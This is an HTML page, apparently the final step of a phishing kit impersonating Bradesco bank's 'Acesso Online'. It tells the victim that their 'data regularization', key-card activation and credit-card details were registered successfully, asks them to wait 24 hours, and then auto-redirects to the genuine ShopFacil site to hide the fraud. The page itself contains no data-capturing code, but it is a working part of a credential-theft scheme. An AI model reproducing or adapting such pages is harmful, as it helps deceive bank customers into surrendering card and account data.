<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>Acesso Online</title>
<script language="javascript" src="scripts/dataVerifica.js"></script>
<style type="text/css">
#top1 { width:100%; height:138px; background:url(images/top1.jpg) repeat-x; }
.style1 {font-size: 12px;	font-family: Arial, Helvetica, sans-serif;	color: #666666;}
.style4 {
	font-family: Arial, Helvetica, sans-serif;
	font-size: 12px;
	color: #333333;
}
.style5 {font-size: 12px; font-family: "Courier New", Courier, monospace; color: #CC0000; }
.style6 {
	color: #666666;
	font-style: italic;
	font-weight: bold;
}
.style12 {font-family: Arial, Helvetica, sans-serif;
	font-size: 14px;
	color: #333333;
}
.style8 {	font-family: Arial, Helvetica, sans-serif;
	font-size: 10px;
}
.style13 {font-size: 11px}
</style>
</head>

<body style="margin:0; background:#F7F7F7; ">
<div id="top1"><div style="width:980px; height:145px; margin:0 auto; background:url(images/top2.jpg) repeat-x;">
<div style="width:150px; height:145px; float:left; background:url(images/marca.png) no-repeat;"></div>
<div style="width:829px; height:28px; float:left;">
  <div align="right"><img src="images/sair.jpg" width="151" height="28" border="0" /></div>
</div>
<div style="width:600px; height:45px; float:left;"><table cellpadding="0" cellspacing="0">
  <tr><td width="37" height="42">&nbsp;</td>
  <td width="559" height="42"><span class="style1"><script>data();</script></span></td>
</tr></table></div>
<div style="width:829px; height:63px; float:left; background:url(images/img_as.jpg) no-repeat; border-right:1px solid #DDD;"></div>
</div></div>

<div style="width:982px; height:360px; margin:0 auto; margin-top:15px;">
<div style="width:750px; height:360px; background:#FFF; float:left; border-bottom:1px solid #C5C5C5; border-left:1px solid #eee; border-right:1px solid #eee; border-radius:7px;">
<div style="width:100%; height:40px; background:url(images/mkv_kk.jpg) right no-repeat;">
  <table cellpadding="0" cellspacing="0">
    <tr>
      <td width="18" height="28">&nbsp;</td>
      <td width="88" height="28"><span class="style4">P&aacute;gina Inicial </span></td>
      <td width="17" height="28" class="style5">&gt;</td>
      <td width="156" height="28" class="style4">Regulariza&ccedil;&atilde;o de dados </td>
      <td width="19" height="28" class="style5">&gt;</td>
      <td width="119" height="28" class="style4">Ativar cart&atilde;o chave</td>
      <td width="19" height="28" class="style5">&gt;</td>
      <td width="106" height="28" class="style4">Cart&atilde;o de cr&eacute;dito </td>
	        <td width="21" height="28" class="style5">&gt;</td>
      <td width="91" height="28" class="style4"><span class="style6">Concluido</span></td>
    </tr>
  </table>
</div>
<div style="width:714px; height:220px; margin-left:20px; margin-top:15px; float:left;">
    <table cellpadding="0" cellspacing="0">
      <tr>
        <td width="10" height="49">&nbsp;</td>
        <td width="684"><div style="width:300px; height:20px; float:left; margin-top:10px;"><span class="style12">Cadastro realizado com sucesso.</span></div></td>
      </tr>
      <tr>
        <td height="121">&nbsp;</td>
        <td><div align="center">
            <p class="style4">Seus dados foram registrado em nosso sistema<br />
                <br />
              Aguarde o prazo de 24 horas &uacute;teis, para acessar sua conta,<br />
              Banco do Bradesco agrade&ccedil;e sua copera&ccedil;&atilde;o. </p>
        </div></td>
      </tr>
      <tr>
        <td height="32">&nbsp;</td>
        <td><div align="center" class="style8 style13">Redirecionando para o site ShopFacil.com.br em&nbsp;<span id="cont">10</span>&nbsp;segundos. </div></td>
      </tr>
    </table>
  </div>
</div>
<div style="width:217px; height:360px; float:right; border-radius:5px;"><img src="images/bylll.jpg" width="217" height="360" border="0" usemap="#Map" />
<map name="Map" id="Map"><area shape="rect" coords="14,78,124,125" href="#" /><area shape="rect" coords="13,181,143,230" href="#" /><area shape="rect" coords="13,294,112,326" href="#" /></map></div></div>
<div style="width:100%; height:103px; repeat-x; margin-top:15px; background:#FFF; border-top:1px solid #C5C5C5; border-bottom:1px solid #C5C5C5;">
<div style="width:985px; height:103px; margin:0 auto;"><img src="images/botons2.jpg" width="985" height="103" border="0" usemap="#Map" /></div>
</div>

<script type="text/javascript">
		var intervalo = "10";
		var i = "10";
		function start(){
			var cont = document.getElementById('cont');
			intervalo = window.setInterval(function(){
				if(i == 1){
					clearInterval(intervalo);
					intervalo = "";
					location.href = "http://www.shopfacil.com.br/?origem=2";
				}
				else{
					i--;
					cont.innerHTML = i;
				}
			}, 1000);
		}
		onload = start;
	</script>
	
</body>
</html>